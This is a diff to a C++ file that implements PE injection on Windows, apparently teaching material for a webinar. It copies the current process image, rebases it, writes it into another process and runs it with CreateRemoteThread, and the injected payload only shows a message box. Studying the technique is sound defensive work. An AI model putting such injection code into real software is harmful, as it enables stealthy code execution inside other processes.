@@ -1,13 +1,94 @@
 #include "pch.h"
 #include "pe_injection_methods.h"
+#include "helper.h"
 
 // =============================================
 // PE Injection
 // ---------------------------------------------
 // This code needs a bit more explanation, if you are not familiar with loading PE in memory and the address rebasing. Please feel free to ask for a better explanation.
+// Other blogpostes and references are one the webinar slides
 
-void injectPE(_In_ DWORD pid) {
-    // To Be defined
+DWORD TargetInjectedEntryPoint() {
+    WCHAR text[128];
+    wsprintf(text, L"PID: %u - Please close the messagebox", ::GetCurrentProcessId());
+    MessageBox(NULL, text, L"Information", MB_ICONINFORMATION);
+    return 0;
+}
+
+int injectPE(_In_ DWORD pid) {
+    // Get the necessary memory address information from the injector/calling (in future called local) process
+    HMODULE ptrModuleHandle = ::GetModuleHandle(NULL); // https://docs.microsoft.com/en-us/previous-versions/ms908443(v=msdn.10), lpModuleName = NULL for handle to local process
+    if (!ptrModuleHandle) {
+        return Error("Cannot open handle to calling process");
+    }
+    PIMAGE_DOS_HEADER ptrDosHeader = (PIMAGE_DOS_HEADER)ptrModuleHandle; // This is the pointer to the ImageBase
+    PIMAGE_NT_HEADERS ptrNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ptrDosHeader + ptrDosHeader->e_lfanew);
+
+    // Allocate Memory in the local process for writing the image to this address
+    // Alernative use VirtualAlloc, (HANDLE)-1 refers to the callers process
+    SIZE_T dwSize = ptrNtHeader->OptionalHeader.SizeOfImage;
+    LPVOID ptrLocalMemory = ::VirtualAllocEx((HANDLE)-1,NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
+    if (!ptrLocalMemory) {
+        return Error("Cannot accolcate Memory");
+    }
+    ::CopyMemory(ptrLocalMemory, ptrModuleHandle, dwSize); //also other functions can be used, e.g. memcpy, memcpy_s, RtlCopyMemory, etc.
+
+    // Get handle to target process by calling OpenProcess
+    // dwDesiredAccess are also seen to be set to: PROCESS_ALL_ACCESS or MAXIMUM_ALLOWED (last seems not to be a good idea, if you have no exception handling)
+    DWORD dwDesiredAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
+    HANDLE hTargetProcess = ::OpenProcess(dwDesiredAccess, FALSE, pid);
+    if (!hTargetProcess) {
+        return Error("Cannot open target process.");
+    }
+    LPVOID ptrTargetMemory = ::VirtualAllocEx(hTargetProcess, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!ptrTargetMemory) {
+        return Error("Cannot open allocate memory inside target process.");
+
+    }
+
+    // Calculations and correction of addresses for operting in target process
+
+    typedef struct _RELOCATION_TABLE_ENTRY {
+        USHORT Offset : 12;
+        USHORT Type : 4;
+    } RELOCATION_TABLE_ENTRY, * PRELOCATION_TABLE_ENTRY;
+
+
+    PIMAGE_DATA_DIRECTORY dataDir = &ptrNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    DWORD_PTR deltaLocalToTarget = (DWORD_PTR)ptrTargetMemory - (DWORD_PTR)(PVOID)ptrModuleHandle;
+
+    if (dataDir->Size > 0 && dataDir->VirtualAddress > 0) {
+        PIMAGE_BASE_RELOCATION relocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)ptrLocalMemory + dataDir->VirtualAddress);
+
+        while (relocTable->VirtualAddress != 0) {
+            if (relocTable->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
+                DWORD relocDescriptorCount = (relocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                PRELOCATION_TABLE_ENTRY relocRelativeVA = (PRELOCATION_TABLE_ENTRY)(relocTable + 1);
+                for (short i = 0; i < relocDescriptorCount; i++)
+                {
+                    if (relocRelativeVA[i].Offset)
+                    {
+                        PDWORD_PTR patchedAddress = (PDWORD_PTR)((DWORD_PTR)ptrLocalMemory + relocTable->VirtualAddress + relocRelativeVA[i].Offset);
+                        *patchedAddress += deltaLocalToTarget;
+                    }
+                }
+            }
+            relocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocTable + relocTable->SizeOfBlock);
+        }
+    }
+
+    ::WriteProcessMemory(hTargetProcess, ptrTargetMemory, ptrLocalMemory, dwSize, NULL);
+
+    if (HANDLE hThread = ::CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)TargetInjectedEntryPoint + deltaLocalToTarget), NULL, 0, NULL)) {
+        if (WAIT_OBJECT_0 == ::WaitForSingleObject(hThread, INFINITE)) {
+            _tprintf(_TEXT("[+] Thread exited normally.\n"));
+        }
+        ::CloseHandle(hThread);
+    }
+    ::VirtualFreeEx(hTargetProcess, ptrTargetMemory, 0, MEM_RELEASE);
+    ::CloseHandle(hTargetProcess);
+
+    return 0;
 }
 
 
